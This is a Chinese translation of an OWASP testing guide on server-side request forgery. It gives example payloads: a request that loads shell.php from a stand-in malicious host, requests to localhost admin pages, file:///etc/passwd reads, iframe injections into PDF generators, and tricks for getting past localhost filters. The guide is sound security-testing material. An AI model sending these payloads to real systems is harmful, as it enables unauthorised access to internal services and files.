# 服务端请求伪造测试

## 概述

Web应用程序常与内部或外部资源交互。虽然预期仅目标资源会处理所发送的数据，但不当处理可能导致注入攻击。其中一种注入攻击称为服务器端请求伪造（SSRF）。成功的SSRF攻击可使攻击者获得对应用程序或组织内受限操作、内部服务或内部文件的访问权限，某些情况下甚至可能导致远程代码执行（RCE）。

## 测试目标

- 识别SSRF注入点。
- 测试注入点是否可利用。
- 评估漏洞严重性。

## 测试方法

测试SSRF时，需尝试使目标服务器意外加载或保存可能恶意的内容。最常见的是本地及远程文件包含测试。SSRF另一关键点在于信任关系：应用服务器常可与用户无法直接访问的其他后端系统交互。这些后端系统通常使用不可路由的私有IP地址或仅允许特定主机访问，因受网络拓扑保护，往往缺乏复杂控制措施，可能包含敏感数据或功能。

参考以下请求示例：

``` http
GET https://example.com/page?page=about.php
```

使用以下载荷测试该请求

#### 加载文件内容

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

#### 访问受限页面

```http
GET https://example.com/page?page=http://localhost/admin
```

或：

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

通过环回接口访问仅限主机访问的内容。该机制意味着若您拥有主机访问权，则同时具备直接访问`admin`页面的权限。

此类信任关系（源自本地机器的请求与普通请求区别处理）往往是导致SSRF成为关键漏洞的原因。

#### 获取本地文件

```http
GET https://example.com/page?page=file:///etc/passwd
```

### 使用的HTTP方法

以上所有载荷均适用于任何类型的HTTP请求，并可注入到请求头和Cookie值中。

关于POST请求的SSRF需注意：SSRF可能以盲注方式显现，因为应用程序可能不会立即返回响应。注入的数据可能被用于其他功能（如PDF报告、发票或订单处理等），这些内容可能仅对内部员工可见，而终端用户或测试人员无法直接查看。

有关盲注SSRF的更多信息，请参阅[此链接](https://portswigger.net/web-security/ssrf/blind)或文末参考资料部分。

### PDF生成器

某些情况下，服务器可能将上传文件转换为PDF格式。可尝试注入指向内部服务的`<iframe>`、`<img>`、`<base>`或`<script>`元素，或CSS的`url()`函数（PDF生成器在解析HTML时，会加载其中的外部资源）。

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### 常见过滤绕过方法

部分应用程序会阻止对`localhost`和`127.0.0.1`的引用，可通过以下方式绕过：

- 使用解析为`127.0.0.1`的替代IP表示形式：
    - 十进制表示法：`2130706433`
    - 八进制表示法：`017700000001`
    - IP简写形式：`127.1`
- 字符串混淆
- 注册指向`127.0.0.1`的自定义域名

若应用程序仅允许符合特定表达式（如域名格式）的输入，但URL解析器实现存在缺陷，可实施类似于[语义攻击](https://tools.ietf.org/html/rfc3986#section-7.6)的绕过：

- 使用`@`字符分隔用户信息与主机：`https://预期域名@攻击者域名`
- 使用`#`字符进行URL分段：`https://攻击者域名#预期域名`
- URL编码
- 模糊测试
- 上述方法的组合运用

更多载荷及绕过技术请参阅文末参考资料。

## 修复方案

服务器端请求伪造（SSRF）被公认为最难防御的攻击之一，若不采用允许列表（仅允许特定IP和URL）则难以有效防护。更多SSRF防护方案请参阅[服务器端请求伪造防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)。

## 参考资料

- [WSTG-INPV-19](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md)
- [swisskyrepo：SSRF载荷库](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [利用SSRF漏洞读取内部文件](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [通过SSRF漏洞滥用AWS元数据服务](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP服务器端请求伪造防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger：SSRF技术详解](https://portswigger.net/web-security/ssrf)
- [Portswigger：盲注SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Bugcrowd网络研讨会：SSRF攻防实践](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
- [Hackerone技术博客：SSRF漏洞剖析](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101：SSRF教学课程](https://www.hacker101.com/sessions/ssrf.html)
- [URI通用语法规范](https://tools.ietf.org/html/rfc3986)
